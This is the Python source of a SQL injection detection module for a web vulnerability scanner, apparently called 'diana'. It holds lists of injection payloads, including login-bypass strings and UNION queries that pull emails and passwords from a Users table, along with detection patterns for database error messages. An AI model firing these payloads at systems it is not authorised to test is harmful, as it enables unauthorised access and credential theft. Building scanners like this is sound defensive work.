"""SQL Injection detection module."""

from __future__ import annotations

import uuid
from urllib.parse import urlencode

from diana.config import ScanConfig
from diana.core.models import (
    Endpoint,
    Finding,
    Hypothesis,
    Payload,
    Severity,
    SiteMap,
    VulnType,
)
from diana.scanners.base import BaseScanner

# Error-based detection patterns
SQL_ERROR_PATTERNS = [
    "you have an error in your sql syntax",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql syntax.*mysql",
    "warning.*mysql_",
    "valid mysql result",
    "mysqlclient",
    "postgresql.*error",
    "warning.*pg_",
    "npgsql",
    "microsoft.*odbc.*sql.*server",
    "microsoft.*oledb.*sql.*server",
    "jet database engine",
    "oracle.*error",
    "ora-[0-9]{5}",
    "sqlite.*error",
    "sqlite3.operationalerror",
    "near \".*\": syntax error",
    "sqlexception",
    "system.data.sqlclient",
    "pdo.*exception",
]

# Static payloads for non-AI mode
STATIC_SQLI_PAYLOADS = [
    # Error-based
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    # Boolean-blind
    "1' AND '1'='1",
    "1' AND '1'='2",
    # UNION-based (escalating column count for data extraction)
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    # UNION with data extraction (common column counts)
    "' UNION SELECT sql,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM sqlite_master--",
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    # Time-based blind
    "1; WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--",
    "1' AND pg_sleep(5)--",
    # NoSQL injection
    "' || '1'=='1",
    "{\"$gt\": \"\"}",
    "{\"$ne\": null}",
]

# Additional payloads for search/query parameters (more likely to return data)
SEARCH_SQLI_PAYLOADS = [
    "')) OR 1=1--",
    "')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--",
    "')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--",
    "qwert')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--",
]


class SQLiScanner(BaseScanner):
    name = "sqli"
    description = "SQL Injection (error-based, boolean-blind, time-blind) detection"

    @property
    def vuln_types(self) -> list:
        return [VulnType.SQLI, VulnType.SQLI_BLIND]

    async def scan(self, config: ScanConfig) -> list[Finding]:
        findings: list[Finding] = []

        # Pull work from queue — each item is a param to test
        work_items = self.claim_work(limit=50)

        for item in work_items:
            params = item.get("payload", {}).get("params", {})
            endpoint = Endpoint(
                url=item["url"],
                method=item["method"],
                parameters=params,
            )

            if item.get("payload", {}).get("type") == "login_endpoint":
                # Login injection test
                login_findings = await self._test_login_injection_endpoint(endpoint)
                findings.extend(login_findings)
            elif params:
                payloads = await self._get_payloads_for_endpoint(endpoint, config)
                for payload in payloads:
                    finding = await self._test_payload(endpoint, payload)
                    if finding:
                        findings.append(finding)
                        # Found SQLi — enqueue to access_control for IDOR check
                        self.enqueue_to(
                            "access_control", item["url"], item["method"],
                            payload={"related_finding": f"SQLi found: {finding.title}"},
                        )

            self.complete_work(item["queue_id"])

        return findings

    async def _get_payloads_for_endpoint(
        self, endpoint: Endpoint, config: ScanConfig,
    ) -> list[Payload]:
        """Get payloads for an endpoint — AI-generated + static."""
        return await self._get_payloads(endpoint)

    async def _get_payloads(
        self, endpoint: Endpoint,
    ) -> list[Payload]:
        payloads: list[Payload] = []

        if self.ai:
            hyp = Hypothesis(
                vuln_type=VulnType.SQLI,
                endpoint=endpoint,
                confidence=0.5,
                reasoning="Endpoint accepts parameters that may be used in SQL queries",
            )
            ai_payloads = await self.ai.generate_payloads(hyp)
            payloads.extend(ai_payloads)

        for p in STATIC_SQLI_PAYLOADS:
            payloads.append(Payload(value=p, vuln_type=VulnType.SQLI))

        # Add search-specific UNION payloads for search/query endpoints
        if any(kw in endpoint.url.lower() for kw in ["search", "query", "find", "lookup"]):
            for p in SEARCH_SQLI_PAYLOADS:
                payloads.append(Payload(value=p, vuln_type=VulnType.SQLI, context="search"))

        return payloads

    async def _test_payload(
        self,
        endpoint: Endpoint,
        payload: Payload,
    ) -> Finding | None:
        """Test for SQL injection via error-based, UNION-based, and time-based detection."""
        # Get a baseline response for comparison
        baseline_len = 0
        try:
            if endpoint.method.upper() == "GET":
                baseline_url = endpoint.url
                if "?" not in baseline_url:
                    baseline_url = f"{baseline_url}?{urlencode(endpoint.parameters)}"
                baseline_resp = await self.http.get(baseline_url)
                baseline_len = len(baseline_resp.text)
        except Exception:
            pass

        for param_name in endpoint.parameters:
            test_params = dict(endpoint.parameters)
            test_params[param_name] = payload.value

            try:
                if endpoint.method.upper() == "GET":
                    url = endpoint.url
                    if "?" not in url:
                        url = f"{url}?{urlencode(test_params)}"
                    response = await self.http.get(url)
                else:
                    response = await self.http.post(endpoint.url, data=test_params)
            except Exception:
                continue

            # Error-based detection
            response_lower = response.text.lower()
            for pattern in SQL_ERROR_PATTERNS:
                if pattern in response_lower:
                    return Finding(
                        id=f"SQLI-{uuid.uuid4().hex[:8]}",
                        vuln_type=VulnType.SQLI,
                        severity=Severity.CRITICAL,
                        title=f"SQL Injection in {param_name} at {endpoint.url}",
                        description=(
                            f"The parameter '{param_name}' is vulnerable to SQL injection. "
                            f"Database error message was disclosed in the response."
                        ),
                        endpoint=endpoint,
                        evidence=response.text[:500],
                        payload_used=payload.value,
                        cwe_id="CWE-89",
                        remediation=(
                            "Use parameterized queries / prepared statements. "
                            "Never concatenate user input into SQL strings."
                        ),
                    )

            # UNION-based detection — response contains data that shouldn't be there
            if "UNION" in payload.value.upper() and response.status_code == 200:
                # Check for database schema artifacts
                union_indicators = [
                    "sqlite_master", "create table", "information_schema",
                    "password", "credential", "secret",
                ]
                for indicator in union_indicators:
                    if indicator in response_lower and (
                        baseline_len == 0 or len(response.text) > baseline_len * 1.5
                    ):
                        return Finding(
                            id=f"SQLI-UNION-{uuid.uuid4().hex[:8]}",
                            vuln_type=VulnType.SQLI,
                            severity=Severity.CRITICAL,
                            title=f"UNION SQL Injection in {param_name} at {endpoint.url}",
                            description=(
                                f"The parameter '{param_name}' is vulnerable to UNION-based "
                                f"SQL injection, allowing extraction of database contents."
                            ),
                            endpoint=endpoint,
                            evidence=response.text[:500],
                            payload_used=payload.value,
                            cwe_id="CWE-89",
                            remediation=(
                                "Use parameterized queries / prepared statements. "
                                "Never concatenate user input into SQL strings."
                            ),
                        )

            # Time-based blind detection
            if "SLEEP" in payload.value.upper() or "WAITFOR" in payload.value.upper() or "pg_sleep" in payload.value:
                # TODO: Compare response time against baseline
                pass

        return None

    async def _test_login_injection_endpoint(self, endpoint: Endpoint) -> list[Finding]:
        """Test a single login endpoint for SQL injection auth bypass."""
        return await self._test_login_injection([endpoint])

    async def _test_login_injection(self, login_endpoints: list[Endpoint]) -> list[Finding]:
        """Test login endpoints for SQL injection auth bypass."""
        findings: list[Finding] = []

        if not login_endpoints:
            return findings

        login_payloads = [
            "' OR 1=1--",
            "' OR '1'='1'--",
            "admin'--",
            "' OR 1=1#",
            "\" OR 1=1--",
        ]

        # Common login field patterns — tried in order
        # None marks the injection target field
        common_field_sets = [
            {"email": None, "password": "x"},
            {"username": None, "password": "x"},
            {"user": None, "pass": "x"},
            {"login": None, "password": "x"},
        ]

        for endpoint in login_endpoints:
            # Build field sets: start with any real params from crawler,
            # then fall back to common patterns
            field_sets = []

            if endpoint.parameters:
                param_names = list(endpoint.parameters.keys())
                user_field = next(
                    (p for p in param_names
                     if p.lower() in ("email", "username", "user", "login")),
                    None,
                )
                if user_field:
                    field_sets.append({user_field: None, **{
                        p: "x" for p in param_names if p != user_field
                    }})

            # Always include common patterns as fallback
            field_sets.extend(common_field_sets)

            for fields in field_sets:
                user_field = next(k for k, v in fields.items() if v is None)

                for sqli_payload in login_payloads:
                    test_data = dict(fields)
                    test_data[user_field] = sqli_payload

                    try:
                        response = await self.http.post(
                            endpoint.url,
                            json=test_data,
                        )
                    except Exception:
                        continue

                    # Check if we got authenticated (200 + token = SQLi auth bypass)
                    if response.status_code == 200:
                        body = response.text.lower()
                        if any(indicator in body for indicator in [
                            "token", "jwt", "session", "authenticated", "success",
                        ]):
                            findings.append(Finding(
                                id=f"SQLI-AUTH-{uuid.uuid4().hex[:8]}",
                                vuln_type=VulnType.SQLI,
                                severity=Severity.CRITICAL,
                                title=f"SQL Injection Auth Bypass at {endpoint.url}",
                                description=(
                                    f"The login endpoint accepts SQL injection in the "
                                    f"'{user_field}' field, allowing authentication bypass. "
                                    f"An attacker can log in as any user without valid credentials."
                                ),
                                endpoint=endpoint,
                                evidence=response.text[:500],
                                payload_used=sqli_payload,
                                cwe_id="CWE-89",
                                remediation=(
                                    "Use parameterized queries for authentication. "
                                    "Never concatenate user input into SQL WHERE clauses."
                                ),
                            ))
                            return findings  # One finding is enough

                    # Also check for error-based SQLi on login
                    response_lower = response.text.lower()
                    for pattern in SQL_ERROR_PATTERNS:
                        if pattern in response_lower:
                            findings.append(Finding(
                                id=f"SQLI-LOGIN-{uuid.uuid4().hex[:8]}",
                                vuln_type=VulnType.SQLI,
                                severity=Severity.CRITICAL,
                                title=f"SQL Injection in login at {endpoint.url}",
                                description=(
                                    f"The login endpoint is vulnerable to SQL injection "
                                    f"in the '{user_field}' field. Database error was disclosed."
                                ),
                                endpoint=endpoint,
                                evidence=response.text[:500],
                                payload_used=sqli_payload,
                                cwe_id="CWE-89",
                                remediation=(
                                    "Use parameterized queries for authentication."
                                ),
                            ))
                            return findings

        return findings
